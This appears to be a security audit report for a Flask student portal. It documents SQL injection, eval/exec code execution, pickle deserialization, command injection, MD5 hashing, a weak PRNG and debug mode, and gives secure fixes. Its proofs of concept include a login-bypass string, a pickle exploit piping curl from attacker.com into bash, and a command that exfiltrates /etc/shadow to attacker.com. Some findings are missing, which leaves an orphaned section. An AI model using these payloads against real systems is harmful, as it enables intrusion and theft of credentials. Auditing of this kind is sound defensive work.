F-01 Critical SQL Injection via String Concatenation
CWE-89 A03:2021 Injection
Affected Location
student_portal.py — Function login() — Lines 46–48
Vulnerable Code
44username = request.form.get('username', '') 45password = request.form.get('password', '') 46conn = get_db() 47cursor = conn.cursor() 48query = "SELECT * FROM users WHERE username='" + username + \ 49 "' AND password='" + password + "'" 50cursor.execute(query)
Description
The login() endpoint constructs the SQL query by directly concatenating unsanitised HTTP form parameters into the query string. An attacker who submits ' OR '1'='1 as the username will authenticate without a valid password, bypassing all authentication logic.
Proof of Concept
POST /login username=admin' OR '1'='1' --&password=anything # Resulting query (always TRUE): SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='...'
Impact
Authentication bypass for any user account. Full read/write/delete access to all student records. Potential for database schema exfiltration via UNION-based injection. On SQLite, combined with other vulns, may escalate to file system access.
Remediation
  • Replace string concatenation with SQLite3 parameterized queries using ? placeholders.
  • Never interpolate any user input directly into a SQL string.
  • Consider an ORM (SQLAlchemy) which uses parameterized queries by default.
  • Add server-side input validation: enforce max length, allowed characters.
Secure Code Example
47# Secure: parameterized query — user input is always data, never SQL 48cursor.execute( 49 "SELECT * FROM users WHERE username = ? AND password = ?", 50 (username, hashed_pw) # pass as a tuple, NOT in the string 51)
F-02 Critical Remote Code Execution via eval()
CWE-95 A03:2021 Injection
Affected Location
calculate() — Line 81
Vulnerable Code
79def calculate(): 80 expression = request.form.get('expression', '') 81 result = eval(expression) # ← CRITICAL: executes any Python expression 82 return jsonify({'result': str(result)})
Proof of Concept
POST /calculate expression=__import__('os').system('id') # Executes shell command expression=__import__('os').popen('cat /etc/passwd').read() # File read expression=__import__('subprocess').getoutput('rm -rf /tmp/data') # File deletion
Impact
Full Remote Code Execution as the web server process user. An attacker can read any file accessible to the process, install backdoors, pivot to internal network, or completely compromise the server.
Remediation
  • Remove eval() entirely. Use ast.literal_eval() only for safe Python literals (numbers, strings).
  • For math expressions, use a safe parser library such as simpleeval or implement an expression parser with a restricted grammar.
  • Validate that input only contains digits and safe operators before any evaluation.
Secure Code Example
import ast, operator, re ALLOWED_OPS = {ast.Add: operator.add, ast.Sub: operator.sub, ast.Mult: operator.mul, ast.Div: operator.truediv} def safe_eval(expr): """Evaluates simple arithmetic only — no builtins, no imports.""" if not re.fullmatch(r'[\d\s\+\-\*/\.\(\)]+', expr): raise ValueError("Invalid expression") tree = ast.parse(expr, mode='eval') return _eval_node(tree.body) def _eval_node(node): if isinstance(node, ast.Num): return node.n if isinstance(node, ast.BinOp): return ALLOWED_OPS[type(node.op)](_eval_node(node.left), _eval_node(node.right)) raise TypeError(f"Unsupported: {node}")
F-03 Critical Remote Code Execution via exec()
CWE-95 A03:2021 Injection
Affected Location
run_script() — Line 94
Vulnerable Code
94 exec(script) # ← executes complete Python programs from HTTP body
Impact
This is a deliberate web shell. Any authenticated (or unauthenticated, if auth is bypassed via F-01) user can execute arbitrary Python on the server with no restrictions whatsoever.
Remediation
  • Remove this endpoint entirely. There is no safe way to expose exec() over HTTP.
  • If scripting is a business requirement, use a sandboxed environment (Docker container with no network access, resource limits).
  • Alternatively use a pre-approved list of report functions that can be invoked by name, never by arbitrary code.
F-04 Critical Insecure Deserialization via pickle.loads()
CWE-502 A08:2021 Integrity Failures
Affected Location
upload_profile() — Line 107
Vulnerable Code
107 profile = pickle.loads(raw_data) # ← executes __reduce__ during deserialization
Proof of Concept
import pickle, os class Exploit(object): def __reduce__(self): return (os.system, ('curl http://attacker.com/shell.sh | bash',)) payload = pickle.dumps(Exploit()) requests.post('http://target/upload-profile', data=payload) # → RCE
Impact
Unauthenticated Remote Code Execution. The pickle protocol executes arbitrary Python via the __reduce__ method during deserialization, before any application code runs.
Remediation
  • Replace pickle with json.loads() for all untrusted data interchange.
  • If binary serialization is required, use msgpack or protobuf with a typed schema.
  • Never deserialize data from an HTTP request body using pickle regardless of authentication state.
Secure Code Example
import json profile = json.loads(request.get_data(as_text=True)) name = str(profile.get('name', ''))[:100] # typed access + length limit
F-05 High Command Injection — subprocess(shell=True)
CWE-78 A03:2021 Injection
Affected Location
generate_report() — Line 121
Vulnerable Code
121 cmd = f"python tools/report_gen.py --id {student_id} --format {report_type}" 122 output = subprocess.check_output(cmd, shell=True) # shell interprets ; && | etc.
Proof of Concept
POST /generate-report student_id=1; cat /etc/passwd format=pdf; curl http://attacker.com/exfil?d=$(base64 /etc/shadow)
Impact
Arbitrary OS command execution. Attacker can exfiltrate /etc/passwd, /etc/shadow, application secrets, database files, and establish a reverse shell.
Remediation
  • Use shell=False and pass arguments as a list — the OS will not interpret shell metacharacters.
  • Validate student_id as an integer only; validate format against an allowlist.

Impact
All four credentials are visible to anyone with access to the repository (including former employees, contractors, or a public GitHub leak). Flask's secret_key exposure enables session cookie forgery — an attacker can forge any user's session without knowing their password.

F-08 High Weak Password Hashing — MD5
CWE-327 A02:2021 Crypto Failures
Vulnerable Code
52 hashed_pw = hashlib.md5(password.encode()).hexdigest() # GPU: 60 billion MD5/sec
Impact
A modern GPU cluster can compute ~60 billion MD5 hashes per second. A leaked database of MD5-hashed passwords would be cracked in minutes using rainbow tables or brute force. All student passwords would be compromised.
Remediation
  • Use bcrypt or argon2-cffi — these are intentionally slow and memory-hard.
  • Migrate existing MD5 hashes by prompting users to reset passwords on next login.

F-11 Medium Insecure PRNG for Session Tokens
CWE-338 A02:2021 Crypto Failures
Vulnerable Code
57 token = random.randint(100000, 999999) # 6-digit predictable token
Impact
The token space is only 900,000 values (6 digits). An attacker who can observe a few tokens can reconstruct the Mersenne Twister internal state and predict all future tokens, enabling session hijacking of any active user.
Remediation
  • Use secrets.token_urlsafe(32) which generates 256 bits of cryptographically secure randomness.
  • Flask's built-in session management (signed cookies using itsdangerous) is superior — use it instead of manual tokens.
Secure Code Example
import secrets session['token'] = secrets.token_urlsafe(32) # 256-bit CSPRNG
F-12 Medium Debug Mode Enabled + Server Exposed on 0.0.0.0
CWE-94 A05:2021 Security Misconfiguration
Vulnerable Code
181 app.run(debug=True, host='0.0.0.0', port=5000)
Impact
debug=True activates an interactive Werkzeug debugger accessible at /__debugger__. Combined with host='0.0.0.0', the debugger PIN (often trivially guessable in Docker) becomes exploitable from any network interface, yielding RCE in the browser.
Remediation
  • Set debug=False in all production deployments.
  • Control debug via environment: debug=os.environ.get('FLASK_DEBUG','0')=='1'.
  • Use a production WSGI server (Gunicorn, uWSGI) — never Flask's built-in dev server in production.
  • Bind to 127.0.0.1 and place behind a reverse proxy (Nginx) for external access.
